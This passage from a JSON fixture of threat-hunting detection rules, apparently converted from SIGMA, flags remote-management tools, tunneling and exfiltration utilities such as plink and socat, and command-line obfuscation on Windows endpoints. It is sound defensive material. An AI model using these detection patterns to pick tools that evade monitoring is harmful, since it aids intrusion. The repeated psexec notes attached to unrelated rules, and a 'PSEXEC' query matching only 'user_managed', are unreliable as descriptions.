            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"supremocontrol.com\" or url.address contains \".supremocontrol.com\" or url.address contains \" .nanosystems.it\") or (event.dns.request contains \"supremocontrol.com\" or event.dns.request contains \".supremocontrol.com\" or event.dns.request contains \" .nanosystems.it\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 54
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Chrome Remote Desktop RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Chrome Remote Desktop RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"remote_host.exe\" or src.process.image.path contains \"remoting_host.exe\" or src.process.image.path contains \"\\remoting_host.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 55
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Dameware-mini remote control Protocol RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Dameware-mini remote control Protocol RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"*dntus*.exe\" or src.process.image.path contains \"dwrcs.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 56
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Pulseway RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Pulseway RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \"pulseway.com\" or event.dns.request contains \"pulseway.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 57
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of mRemoteNG RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential mRemoteNG RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"mRemoteNG.exe\" or src.process.image.path contains \"\\mRemoteNG.exe\" or src.process.image.path contains \"\\mRemoteNG.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 58
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of AnyDesk RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential AnyDesk RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"boot.net.anydesk.com\" or url.address contains \"relay-[a-f0-9]{8}.net.anydesk.com:443\" or url.address contains \".anydesk.com\") or (event.dns.request contains \"boot.net.anydesk.com\" or event.dns.request contains \"relay-[a-f0-9]{8}.net.anydesk.com:443\" or event.dns.request contains \".anydesk.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 59
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of ConnectWise Control RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential ConnectWise Control RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"screenconnect.clientservice.exe\" or src.process.image.path contains \"connectwisecontrol.client.exe\" or src.process.image.path contains \"screenconnect.windowsclient.exe\" or src.process.image.path contains \"connectwisechat-customer.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 60
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of NoMachine RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential NoMachine RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"*nomachine*.exe\" or src.process.image.path contains \"nxd.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 61
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Addigy RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Addigy RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"prod.addigy.com\" or url.address contains \"grtmprod.addigy.com\" or url.address contains \"agents.addigy.com\") or (event.dns.request contains \"prod.addigy.com\" or event.dns.request contains \"grtmprod.addigy.com\" or event.dns.request contains \"agents.addigy.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 62
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Splashtop (Beta) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Splashtop (Beta) RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \"splashtop.com\" or event.dns.request contains \"splashtop.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 63
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Supremo RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Supremo RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"supremo.exe\" or src.process.image.path contains \"supremoservice.exe\" or src.process.image.path contains \"supremosystem.exe\" or src.process.image.path contains \"supremohelper.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 64
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of PSEXEC RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential PSEXEC RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \"user_managed\" or event.dns.request contains \"user_managed\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 65
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of UltraViewer RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential UltraViewer RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"UltraViewer_Service.exe\" or src.process.image.path contains \"UltraViewer_Desktop.exe\" or src.process.image.path contains \"ultraviewer.exe\" or src.process.image.path contains \"C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe\" or src.process.image.path contains \"\\UltraViewer_Desktop.exe\" or src.process.image.path contains \"ultraviewer_desktop.exe\" or src.process.image.path contains \"ultraviewer_service.exe\" or src.process.image.path contains \"UltraViewer_Desktop.exe\" or src.process.image.path contains \"UltraViewer_Service.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 66
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"cmd.exe\" via the AnyViewer RMM agent on a remote management sessions.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Remote Access Tool - Cmd.EXE Execution via AnyViewer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\AVCore.exe\" and src.process.cmdline contains \"AVCore.exe\\\" -d\" and tgt.process.image.path contains \"\\cmd.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 67
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the Ammy Admin RMM agent for remote management.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Remote Access Tool - Ammy Admin Agent Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"AMMYY\\aa_nts.dll\\\",run\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 68
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of well known tools that can be abused for data exfiltration and tunneling.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1041",
                "t1572",
                "t1071"
            ],
            "name": "Tunneling Tool Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\httptunnel.exe\" or tgt.process.image.path contains \"\\plink.exe\" or tgt.process.image.path contains \"\\socat.exe\" or tgt.process.image.path contains \"\\stunnel.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 69
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects child processes of \"dfsvc\" which indicates a ClickOnce deployment execution.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "ClickOnce Deployment Execution - Dfsvc.EXE Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\dfsvc.exe\" and tgt.process.image.path contains \"\\AppData\\Local\\Apps\\2.0\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 70
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential CommandLine obfuscation using unicode characters.\nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Potential CommandLine Obfuscation Using Unicode Characters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\u02e3\" or tgt.process.cmdline contains \"\u02ea\" or tgt.process.cmdline contains \"\u02e2\" or tgt.process.cmdline contains \"\u2215\" or tgt.process.cmdline contains \"\u2044\" or tgt.process.cmdline contains \"\u2015\" or tgt.process.cmdline contains \"\u2014\" or tgt.process.cmdline contains \"\u00a0\" or tgt.process.cmdline contains \"\u00af\" or tgt.process.cmdline contains \"\u00ae\" or tgt.process.cmdline contains \"\u00b6\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 71
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects any child process spawning from \"Diskshadow.exe\". This could be due to executing Diskshadow in interpreter mode or script mode and using the \"exec\" flag to launch other applications.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Diskshadow Child Process Spawned",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\diskshadow.exe\" and (not tgt.process.image.path contains \":\\Windows\\System32\\WerFault.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 72
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
